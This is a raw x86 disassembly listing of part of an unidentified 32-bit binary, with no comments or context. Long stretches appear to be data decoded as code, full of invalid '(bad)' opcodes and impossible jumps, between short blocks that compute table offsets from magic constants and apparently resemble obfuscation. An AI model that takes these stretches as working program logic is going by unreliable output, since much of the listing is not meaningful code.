  41092b:	and    al,BYTE PTR [ebx-0x32bafd96]
  410931:	jp     0x410905
  410933:	je     0x410982
  410935:	jle    0x41098c
  410937:	scas   eax,DWORD PTR es:[edi]
  410938:	mov    cl,BYTE PTR [ecx]
  41093a:	int3   
  41093b:	push   0xb
  41093d:	or     BYTE PTR ds:0x8093edc2,al
  410943:	dec    ch
  410945:	cmc    
  410946:	xchg   BYTE PTR [ecx+eax*2+0x6a],bh
  41094a:	add    eax,0xcf50054c
  41094f:	push   es
  410950:	jbe    0x410993
  410952:	jge    0x41091c
  410954:	ror    dl,1
  410956:	(bad)  
  410957:	hlt    
  410958:	and    BYTE PTR [ebp-0x62],cl
  41095b:	add    BYTE PTR [esi-0x53e1896a],ah
  410961:	jmp    0x41093d
  410963:	mov    esi,DWORD PTR [ecx]
  410965:	mov    al,0x56
  410967:	push   ebp
  410968:	scas   eax,DWORD PTR es:[edi]
  410969:	icebp  
  41096a:	xor    bh,cl
  41096c:	fwait
  41096d:	push   es
  41096e:	mov    WORD PTR [eax-0x32ad2eb8],ds
  410974:	(bad)  
  410975:	jp     0x41093d
  410977:	and    dl,dh
  410979:	xchg   esi,eax
  41097a:	mov    esp,ecx
  41097c:	cmp    al,0xb6
  41097e:	fdivr  QWORD PTR [ebp+eax*8+0x39]
  410982:	push   ebx
  410983:	xor    ebx,DWORD PTR [esp+edi*8+0x2fa9cf26]
  41098a:	dec    BYTE PTR [ecx-0x1f]
  41098d:	std    
  41098e:	pop    ebp
  41098f:	dec    esi
  410990:	in     al,0xc1
  410992:	pop    ss
  410993:	inc    esi
  410994:	shl    BYTE PTR [ebx],1
  410996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410997:	and    dh,BYTE PTR [ebx]
  410999:	es jae 0x4109ac
  41099c:	hlt    
  41099d:	and    BYTE PTR [edx-0x78],cl
  4109a0:	enter  0x14a0,0x56
  4109a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109a5:	push   0xdd775066
  4109aa:	mov    al,ds:0x6582a542
  4109af:	add    ecx,DWORD PTR [ecx+0x22]
  4109b2:	sub    al,0xb8
  4109b4:	lds    eax,FWORD PTR [edx-0x3f]
  4109b7:	fwait
  4109b8:	pop    ss
  4109b9:	aas    
  4109ba:	xchg   ebx,eax
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x42206f
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x42206f
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xbe2b74c6
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [eax],cl
  410a7d:	jo     0x410ae5
  410a7f:	test   dl,0xb8
  410a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a83:	test   eax,0xbf901e0f
  410a88:	mov    ch,0x9f
  410a8a:	shl    ebx,cl
  410a8c:	out    dx,eax
  410a8d:	loop   0x410a87
  410a8f:	xchg   ecx,eax
  410a90:	mov    ss,WORD PTR [esi]
  410a92:	mov    bh,ah
  410a94:	loop   0x410ae6
  410a96:	call   0x5e4cc2ba
  410a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a9c:	mov    edi,0xda956304
  410aa1:	mov    cl,0x3
  410aa3:	ins    DWORD PTR es:[edi],dx
  410aa4:	adc    BYTE PTR [ecx-0xa6a5fff],dl
  410aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aab:	ficomp WORD PTR [edx+0x1]
  410aae:	call   0x51873a3f
  410ab3:	or     DWORD PTR fs:[esp+edi*8],edi
  410ab7:	or     bl,BYTE PTR [eax]
  410ab9:	jmp    DWORD PTR [ebx+0x29]
  410abc:	out    0xfb,eax
  410abe:	mov    al,0x1e
  410ac0:	ins    BYTE PTR es:[edi],dx
  410ac1:	dec    ecx
  410ac2:	inc    ebp
  410ac3:	inc    edi
  410ac4:	and    al,0xea
  410ac6:	xor    al,0x4b
  410ac8:	jo     0x410aab
  410aca:	clc    
  410acb:	arpl   WORD PTR [edi+ebx*2-0xd],dx
  410acf:	sbb    al,0x87
  410ad1:	fsub   QWORD PTR [esi-0x1b]
  410ad4:	jle    0x410ac0
  410ad6:	xor    ebx,DWORD PTR [edi+0x56]
  410ad9:	mov    ecx,0xc047b35d
  410ade:	adc    esi,edx
  410ae0:	inc    eax
  410ae1:	pop    edx
  410ae2:	not    DWORD PTR [edi+0x32e52a30]
  410ae8:	mov    esi,0xa7933435
  410aed:	push   ss
  410aee:	(bad)  
  410aef:	xor    bh,BYTE PTR [ecx+edx*1]
  410af2:	add    BYTE PTR [ecx-0x2e],0xbe
  410af6:	lahf   
  410af7:	add    bh,dh
  410af9:	and    eax,0x2901932c
  410afe:	inc    ebx
  410aff:	sub    BYTE PTR [edi],cl
  410b01:	mov    BYTE PTR [eax+0x48],bh
  410b04:	rcr    BYTE PTR [ecx+eiz*4],0x97
  410b08:	test   al,0xbe
  410b0a:	(bad)  [ebx-0x28]
  410b0d:	int3   
  410b0e:	dec    edi
  410b0f:	xor    bl,BYTE PTR [edi+0x37540ca4]
  410b15:	out    dx,eax
  410b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b17:	dec    ebx
  410b18:	sub    eax,0x4ebc49af
  410b1d:	into   
  410b1e:	mov    esp,0xf948eea2
  410b23:	outs   dx,DWORD PTR ds:[esi]
  410b24:	add    eax,0x3b45403b
  410b29:	xor    al,0xd4
  410b2b:	or     ebx,esi
  410b2d:	push   0xff8b321e
  410b32:	pop    edx
  410b33:	or     DWORD PTR [esi-0x3d],esi
  410b36:	and    eax,0xa06c1ea9
  410b3b:	and    al,0x9e
  410b3d:	xchg   ebx,eax
  410b3e:	(bad)  
  410b3f:	in     eax,dx
  410b40:	in     eax,dx
  410b41:	pop    esp
  410b42:	iret   
  410b43:	shl    dh,1
  410b45:	push   0x73
  410b47:	add    DWORD PTR [eax+0x22],eax
  410b4a:	jle    0x410b51
  410b4c:	cmp    bh,BYTE PTR [ebx]
  410b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4f:	les    eax,FWORD PTR ss:[ebp+0x21]
  410b53:	jnp    0x410b1f
  410b55:	retf   
  410b56:	cs xor al,0xd1
  410b59:	push   edi
  410b5a:	sub    al,0xfa
  410b5c:	xchg   esp,eax
  410b5d:	sbb    BYTE PTR [esi+0x79],0xd7
  410b61:	in     eax,dx
  410b62:	adc    dl,dl
  410b64:	adc    edx,0xab9b6858
  410b6a:	cwde   
  410b6b:	cmp    DWORD PTR [ecx+edx*4+0x7d],eax
  410b6f:	xlat   BYTE PTR ds:[ebx]
  410b70:	(bad)  [ebx-0x5]
  410b73:	push   edx
  410b74:	inc    ecx
  410b75:	ins    BYTE PTR es:[edi],dx
  410b76:	inc    ecx
  410b77:	iret   
  410b78:	call   0xff10b365
  410b7d:	in     eax,dx
  410b7e:	shl    DWORD PTR [edi-0x33a1ff4b],cl
  410b84:	pop    edi
  410b85:	or     edx,DWORD PTR [ecx-0x5]
  410b88:	jno    0x410be3
  410b8a:	xchg   edi,eax
  410b8b:	pusha  
  410b8c:	xor    ecx,ecx
  410b8e:	lds    edi,FWORD PTR [ecx]
  410b90:	ss (bad) 
  410b92:	mov    esp,0x907d9369
  410b97:	mov    eax,ds:0x3ff7d10a
  410b9c:	lahf   
  410b9d:	xor    ah,bh
  410b9f:	pop    es
  410ba0:	fistp  QWORD PTR ds:0xa302
  410ba5:	mov    ecx,edx
  410ba7:	jmp    0x410c14
  410ba9:	jo     0x410b7e
  410bab:	push   ecx
  410bac:	int3   
  410bad:	enter  0x635a,0x9c
  410bb1:	gs pop es
  410bb3:	or     eax,0x19917a33
  410bb8:	inc    edx
  410bb9:	popf   
  410bba:	add    esp,DWORD PTR [ebx+0x32eb4cb8]
  410bc0:	push   esi
  410bc1:	shl    DWORD PTR [esi-0x65a344d9],1
  410bc7:	or     eax,DWORD PTR [edx+0x72]
  410bca:	xor    DWORD PTR [ecx+0x1f],ebx
  410bcd:	inc    edx
  410bce:	and    dh,bl
  410bd0:	test   eax,0x26789100
  410bd5:	popf   
  410bd6:	push   es
  410bd7:	push   0x9a1f98b
  410bdc:	out    dx,eax
  410bdd:	jae    0x410c29
  410bdf:	test   eax,0xaefa3bc7
  410be4:	sub    al,0x84
  410be6:	ficomp WORD PTR [ebx+ebp*2+0x63]
  410bea:	cmp    ecx,esi
  410bec:	pop    es
  410bed:	stc    
  410bee:	arpl   WORD PTR [ecx],di
  410bf0:	mov    bh,BYTE PTR ds:0xe04d5204
  410bf6:	aas    
  410bf7:	and    eax,0xa2dfe1bf
  410bfc:	das    
  410bfd:	dec    BYTE PTR [ecx+0x21]
  410c00:	ret    
  410c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c02:	imul   edi,DWORD PTR [edi+ebx*4-0x17],0x25
  410c07:	cmp    esi,DWORD PTR [ecx+0x23]
  410c0a:	fist   DWORD PTR [edi]
  410c0c:	cmp    ah,BYTE PTR [ebp+0x21707055]
  410c12:	fs test al,0x10
  410c15:	pop    edx
  410c16:	push   es
  410c17:	sbb    bl,bh
  410c19:	sar    DWORD PTR [esi],1
  410c1b:	sbb    eax,0x81bfce98
  410c20:	das    
  410c21:	jnp    0x410c95
  410c23:	xchg   al,dh
  410c25:	into   
  410c26:	lock mov eax,0xefeaecc2
  410c2c:	push   es
  410c2d:	retf   0xf5d
  410c30:	jae    0x410c7c
  410c32:	rol    esi,1
  410c34:	cmp    dl,BYTE PTR [edi-0x5d]
  410c37:	sahf   
  410c38:	mov    edi,0x8f97b108
  410c3d:	sub    bl,BYTE PTR [esi-0x7e]
  410c40:	aaa    
  410c41:	sar    BYTE PTR [eax+edx*8+0x492b70ae],1
  410c48:	push   esp
  410c49:	lods   al,BYTE PTR ds:[esi]
  410c4a:	push   esp
  410c4b:	rol    DWORD PTR [edi+0x577aee55],0x53
  410c52:	in     al,0xf4
  410c54:	mov    edi,0xee6a046b
  410c59:	fst    st(0)
  410c5b:	dec    ebx
  410c5c:	sub    dh,BYTE PTR [ebp+0x5fd250fe]
  410c62:	arpl   WORD PTR ds:0x9324dce5,si
  410c68:	arpl   bx,si
  410c6a:	(bad)  
  410c6b:	mov    cl,0xc8
  410c6d:	or     cl,BYTE PTR [eax+0x7a6a1b5d]
  410c73:	mov    ebp,0x21c8ee20
  410c78:	cmp    edx,DWORD PTR [esi]
  410c7a:	dec    edi
  410c7b:	frstor [edi+0x1519c077]
  410c81:	inc    ecx
  410c82:	mov    ch,BYTE PTR [edx-0x67e7ef1e]
  410c88:	popf   
  410c89:	(bad)  
  410c8a:	out    dx,al
  410c8b:	ja     0x410c8e
  410c8d:	hlt    
  410c8e:	push   0xb562e743
  410c93:	xor    esp,esp
  410c95:	call   FWORD PTR [edi+0x5a]
  410c98:	ins    BYTE PTR es:[edi],dx
  410c99:	cwde   
  410c9a:	lea    ebp,[ebp-0x40]
  410c9d:	rcr    esp,0x92
  410ca0:	dec    eax
  410ca1:	sar    DWORD PTR [eax-0x588a4ccd],1
  410ca7:	scas   al,BYTE PTR es:[edi]
  410ca8:	jmp    0x21d44672
  410cad:	push   edi
  410cae:	xchg   esi,eax
  410caf:	mov    bh,0xee
  410cb1:	fs jmp 0x65d3:0x7a41b084
  410cb9:	jb     0x410cde
  410cbb:	mov    al,0xcb
  410cbd:	mov    ds:0x3490406b,eax
  410cc2:	xor    eax,0x70227067
  410cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc8:	(bad)  
  410cca:	xor    al,0xb9
  410ccc:	ret    0x4ae0
  410ccf:	clc    
  410cd0:	aad    0x24
  410cd2:	fidiv  WORD PTR [ebx-0x5d7bea0d]
  410cd8:	pop    esp
  410cd9:	(bad)  
  410cda:	mov    ds:0xb810d034,al
  410cdf:	adc    eax,0xba8e6bf9
  410ce4:	add    eax,0x9a7ec9d7
  410ce9:	cld    
  410cea:	ja     0x410d3a
  410cec:	adc    al,0x21
  410cee:	pushf  
  410cef:	jae    0x410cf7
  410cf1:	es ret 0xfde1
  410cf5:	adc    BYTE PTR [edx+0x2b12432d],bl
  410cfb:	add    DWORD PTR [edi+0x1c913a2],ebx
  410d01:	std    
  410d02:	push   ebp
  410d03:	jne    0x410d7f
  410d05:	add    eax,0xa571bb25
  410d0a:	cdq    
  410d0b:	mov    dl,0xbe
  410d0d:	mov    cl,0x6e
  410d0f:	jl     0x410cfa
  410d11:	fwait
  410d12:	(bad)  
  410d13:	push   ecx
  410d14:	jle    0x410cee
  410d16:	aad    0x4d
  410d18:	dec    edi
  410d19:	fdiv   st,st(3)
  410d1b:	adc    eax,0x9122afe3
  410d20:	and    ecx,0x6a
  410d23:	test   al,0x48
  410d26:	jmp    0x410cf7
  410d28:	mov    dh,0xa1
  410d2a:	mov    ah,BYTE PTR [ebp-0x1a2eb9c5]
  410d30:	fist   DWORD PTR [ebx+0x4c]
  410d33:	jmp    0x410dab
  410d35:	mov    al,0x99
  410d37:	mov    bl,0x81
  410d39:	pop    eax
  410d3a:	add    eax,0xe646dea6
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffff99
  410d65:	outs   dx,BYTE PTR ds:[esi]
  410d66:	popa   
  410d67:	jo     0x410dd6
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0x2f82:0xbe181814
  410d73:	cs lahf 
  410d75:	loopne 0x410d53
  410d77:	shr    BYTE PTR ds:0x171baa77,1
  410d7d:	aaa    
  410d7e:	call   0x5ced:0x71641126
  410d85:	adc    DWORD PTR [edi-0x667aaf58],ebp
  410d8b:	je     0x410dc4
  410d8d:	and    cl,ah
  410d8f:	add    cl,0x23
  410d92:	in     eax,dx
  410d93:	adc    dl,al
  410d95:	mov    al,0xba
  410d97:	inc    ebx
  410d98:	xchg   ebp,eax
  410d99:	cwde   
  410d9a:	ficom  DWORD PTR [edi]
  410d9c:	dec    eax
  410d9d:	or     eax,0x971a7665
  410da2:	idiv   esp
  410da4:	retf   
  410da5:	push   es
  410da6:	pusha  
  410da7:	test   BYTE PTR [edi+0x6f03baaa],0xe7
  410dae:	daa    
  410daf:	das    
  410db0:	loop   0x410d38
  410db2:	lods   al,BYTE PTR ds:[esi]
  410db3:	jle    0x410dae
  410db5:	inc    ebx
  410db6:	mov    dl,0xbc
  410db8:	fstp   DWORD PTR ds:0x62ddcc6d
  410dbe:	sub    BYTE PTR [edx-0x78dbcda6],ah
  410dc4:	out    dx,al
  410dc5:	mov    cl,0x7
  410dc7:	call   0x266712dc
  410dcc:	popf   
  410dcd:	cmovbe eax,DWORD PTR [edx+eiz*1]
  410dd1:	ret    0x2b6a
  410dd4:	lahf   
  410dd5:	jg     0x410e42
  410dd7:	cmp    esi,DWORD PTR [ecx]
  410dd9:	inc    ecx
  410dda:	int3   
  410ddb:	cwde   
  410ddc:	jnp    0x410dbd
  410dde:	fwait
  410ddf:	xor    DWORD PTR [esi],eax
  410de1:	xor    ebx,DWORD PTR [eax+0x1a17a3d0]
  410de7:	shr    al,0x17
  410dea:	fstp   DWORD PTR [esi]
  410dec:	jo     0x410dd2
  410dee:	dec    ecx
  410def:	dec    edi
  410df0:	xor    edx,DWORD PTR [ebx+0x74b0854]
  410df6:	dec    eax
  410df7:	ins    DWORD PTR es:[edi],dx
  410df8:	xor    ebp,ebx
  410dfa:	ret    
  410dfb:	mov    esp,0xa2888807
  410e00:	sbb    al,0x81
  410e02:	ret    
  410e03:	test   eax,0xce8393e7
  410e08:	lods   al,BYTE PTR ds:[esi]
  410e09:	or     ch,0xd0
  410e0c:	ins    BYTE PTR es:[edi],dx
  410e0d:	div    DWORD PTR [edx-0x1]
  410e10:	lock sbb cl,BYTE PTR [esi]
  410e13:	and    esi,ebp
  410e15:	xchg   esp,eax
  410e16:	jmp    0x410e76
  410e18:	fsubr  st(7),st
  410e1a:	sub    cl,BYTE PTR [esi+0x25]
  410e1d:	addr16 in eax,0xfa
  410e20:	arpl   WORD PTR [eax],bx
  410e22:	icebp  
  410e23:	stos   BYTE PTR es:[edi],al
  410e24:	lock mov al,0x1
  410e27:	enter  0xff6f,0x7f
  410e2b:	mov    cl,0x8
  410e2d:	and    ch,ah
  410e2f:	test   al,0xdb
  410e31:	cwde   
  410e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e33:	(bad)  
  410e34:	jg     0x410dee
  410e36:	pop    edi
  410e37:	mov    ebp,0x92d32880
  410e3c:	push   ecx
  410e3d:	stc    
  410e3e:	add    al,0x4f
  410e40:	mov    ?,WORD PTR ds:0xf107edcb
  410e46:	jp     0x410e73
  410e48:	ja     0x410e15
  410e4a:	(bad)  
  410e4b:	mov    eax,ds:0xf780d337
  410e50:	std    
  410e51:	mov    WORD PTR [ebx-0x3e],fs
  410e54:	or     ebx,DWORD PTR [esp+ebx*1-0x61]
  410e58:	mov    eax,ds:0xbcbebc04
  410e5d:	sub    ch,bh
  410e5f:	repz sub bl,bh
  410e62:	retf   
  410e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e64:	adc    al,0x9a
  410e66:	aam    0x80
  410e68:	xchg   ebx,eax
  410e69:	push   0x48bed094
  410e6e:	mov    bl,0xa4
  410e70:	daa    
  410e71:	xchg   DWORD PTR [esi+0x5],eax
  410e74:	cli    
  410e75:	aam    0x8
  410e77:	ja     0x410eef
  410e79:	cmp    eax,0xdd8e8362
  410e7e:	int    0xff
  410e80:	adc    bh,cl
  410e82:	shl    DWORD PTR [esi+0x10],0xaf
  410e86:	in     eax,0x59
  410e88:	push   edx
  410e89:	pop    ds
  410e8a:	jnp    0x410e1d
  410e8c:	xchg   ecx,eax
  410e8d:	test   BYTE PTR [ebx+0x71fd6afc],ch
  410e93:	pop    edx
  410e94:	imul   ebp,ecx,0xffffffd5
  410e97:	(bad)  
  410e98:	mov    ebp,0x57de5efb
  410e9d:	ror    BYTE PTR [edi],cl
  410e9f:	stos   BYTE PTR es:[edi],al
  410ea0:	mov    bh,0x84
  410ea2:	jge    0x410e97
  410ea4:	xchg   ah,cl
  410ea6:	rol    DWORD PTR [ecx+0x70bbd1b4],0x8a
  410ead:	adc    al,0xe1
  410eaf:	xchg   BYTE PTR [ebp-0x5b],cl
  410eb2:	lods   al,BYTE PTR ds:[esi]
  410eb3:	sbb    eax,0x5cba78f4
  410eb8:	retf   0xac02
  410ebb:	mov    dh,BYTE PTR [edx+0x7d]
  410ebe:	sbb    eax,0x6d8876c7
  410ec3:	aas    
  410ec4:	xchg   esi,eax
  410ec5:	outs   dx,BYTE PTR ds:[esi]
  410ec6:	test   BYTE PTR [ebp+0x7412e44],bh
  410ecc:	out    0xe5,eax
  410ece:	jecxz  0x410eff
  410ed0:	in     al,dx
  410ed1:	ror    DWORD PTR [ecx-0x29],0x85
  410ed5:	xor    DWORD PTR ds:0x5438f492,esp
  410edb:	adc    BYTE PTR [edx+0x32ee5ee8],bh
  410ee1:	jbe    0x410f1d
  410ee3:	dec    eax
  410ee4:	je     0x410f26
  410ee6:	sub    al,BYTE PTR [ecx]
  410ee8:	jl     0x410eb3
  410eea:	shl    DWORD PTR [ebx-0x5bdfa182],0x90
  410ef1:	jp     0x410eba
  410ef3:	idiv   DWORD PTR [edx+0x3da7bfbe]
  410ef9:	dec    edx
  410efa:	int3   
  410efb:	popf   
  410efc:	add    DWORD PTR [ebx+ebp*8+0x46],ecx
  410f00:	out    dx,eax
  410f01:	hlt    
  410f02:	mov    edi,DWORD PTR [eax+0x6c994dd5]
  410f08:	fnsave [edi]
  410f0a:	ins    BYTE PTR es:[edi],dx
  410f0b:	lds    eax,FWORD PTR [eax-0x72]
  410f0e:	int3   
  410f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f10:	sub    al,0x10
  410f12:	mov    gs,edi
  410f14:	repnz (bad) 
  410f16:	sti    
  410f17:	and    ebx,edx
  410f19:	dec    edx
  410f1a:	add    BYTE PTR [eax],0x28
  410f1d:	idiv   BYTE PTR [edi+0x427073c6]
  410f23:	push   ebx
  410f24:	js     0x410efa
  410f26:	leave  
  410f27:	mov    edx,0xa4f3f0a4
  410f2c:	scas   al,BYTE PTR es:[edi]
  410f2d:	xor    ch,BYTE PTR [ecx]
  410f2f:	sahf   
  410f30:	enter  0xda80,0x3b
  410f34:	icebp  
  410f35:	jecxz  0x410f54
  410f37:	xor    al,0xc6
  410f39:	arpl   WORD PTR [ebx+0x6f958070],si
  410f3f:	and    edx,ecx
  410f41:	jmp    0x4df2f32e
  410f46:	fdivr  QWORD PTR [ecx+0x7d]
  410f49:	icebp  
  410f4a:	idiv   BYTE PTR [edi+ecx*1+0x60b35b79]
  410f51:	retf   0x33c1
  410f54:	icebp  
  410f55:	(bad)  
  410f56:	mov    eax,0xab696c90
  410f5b:	stos   BYTE PTR es:[edi],al
  410f5c:	out    0x26,eax
  410f5e:	inc    BYTE PTR [eax+eax*1+0x230bbc0a]
  410f65:	mov    al,ds:0x92222194
  410f6a:	(bad)  
  410f6b:	cmp    dl,BYTE PTR ds:0xfcde2301
  410f71:	leave  
  410f72:	mov    ss,WORD PTR [edx]
  410f74:	xlat   BYTE PTR ds:[ebx]
  410f75:	or     al,0x5b
  410f77:	ror    DWORD PTR [edx],1
  410f79:	rcl    DWORD PTR [esi-0x31],1
  410f7c:	pushf  
  410f7d:	int3   
  410f7e:	add    DWORD PTR [ecx-0x634d98c1],0xf682a66d
  410f88:	push   ds
  410f89:	dec    ebp
  410f8a:	(bad)  
  410f8b:	cmp    bh,ch
  410f8d:	dec    ecx
  410f8e:	data16 clc 
  410f90:	push   ebp
  410f91:	adc    DWORD PTR [edi-0x52924c9a],0xffffffa7
  410f98:	push   ebx
  410f99:	dec    ecx
  410f9a:	sub    edi,DWORD PTR [ecx-0x552045bf]
  410fa0:	out    dx,al
  410fa1:	mov    al,ds:0xa94b0d84
  410fa6:	xlat   BYTE PTR ds:[ebx]
  410fa7:	add    eax,0x74e6f6f3
  410fac:	cwde   
  410fad:	jecxz  0x411028
  410faf:	fwait
  410fb0:	inc    esi
  410fb1:	(bad)  
  410fb2:	test   BYTE PTR [edx-0x510651b],0x80
  410fb9:	pop    esp
  410fba:	ins    DWORD PTR es:[edi],dx
  410fbb:	and    eax,0xf964b1bd
  410fc0:	push   eax
  410fc1:	dec    ecx
  410fc2:	mov    bl,0x21
  410fc4:	xchg   ebx,eax
  410fc5:	inc    esp
  410fc6:	adc    BYTE PTR [ebp-0x63],bl
  410fc9:	mov    dh,0xee
  410fcb:	out    dx,eax
  410fcc:	xchg   ecx,eax
  410fcd:	mov    edi,0xe09c7954
  410fd2:	push   es
  410fd3:	mov    esi,0x68827535
  410fd8:	mov    eax,ds:0x4d95f54e
  410fdd:	jmp    0x3b1d58b6
  410fe2:	mov    edi,0x111405e3
  410fe7:	retf   
  410fe8:	mov    WORD PTR [ebx-0x6794ff15],?
  410fee:	sbb    edi,DWORD PTR [edx]
  410ff0:	test   DWORD PTR [ebx-0x55],0xc28bccc9
  410ff7:	adc    dl,ah
  410ff9:	jl     0x41103a
  410ffb:	mov    edi,0x2dad5b71
  411000:	mov    dh,0xba
  411002:	and    eax,DWORD PTR [edx+0x7d75c49b]
  411008:	or     ecx,DWORD PTR [eax]
  41100a:	push   edx
  41100b:	loop   0x41101f
  41100d:	call   0x47452983
  411012:	inc    edx
  411013:	jge    0x410f98
  411015:	pop    esi
  411016:	popf   
  411017:	xchg   edx,eax
  411018:	push   edi
  411019:	xchg   ebx,eax
  41101a:	dec    esi
  41101b:	test   DWORD PTR [esi+0x56137c26],0x383f0d5
  411025:	cmp    edi,DWORD PTR [edx]
  411027:	and    BYTE PTR [ecx-0x1e],ch
  41102a:	mov    esi,?
  41102c:	retf   0x1350
  41102f:	cli    
  411030:	sub    eax,0x4d8b848c
  411035:	cld    
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
